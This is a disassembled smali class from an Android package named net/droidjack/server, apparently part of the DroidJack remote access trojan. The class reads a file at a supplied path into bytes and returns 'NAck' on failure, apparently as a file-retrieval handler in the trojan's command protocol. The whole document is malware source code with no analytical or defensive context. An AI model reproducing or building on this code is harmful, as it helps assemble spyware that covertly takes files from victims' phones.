.class Lnet/droidjack/server/aq;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/util/concurrent/Callable;


# instance fields
.field final synthetic a:Lnet/droidjack/server/am;

.field private final synthetic b:Ljava/lang/String;


# direct methods
.method constructor <init>(Lnet/droidjack/server/am;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/aq;->a:Lnet/droidjack/server/am;

    iput-object p2, p0, Lnet/droidjack/server/aq;->b:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public a()[B
    .locals 2

    :try_start_0
    iget-object v0, p0, Lnet/droidjack/server/aq;->b:Ljava/lang/String;

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, v1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-static {v0}, La/c;->a(Ljava/io/InputStream;)[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    move-object v1, v0

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-virtual {v1}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public synthetic call()Ljava/lang/Object;
    .locals 1

    invoke-virtual {p0}, Lnet/droidjack/server/aq;->a()[B

    move-result-object v0

    return-object v0
.end method
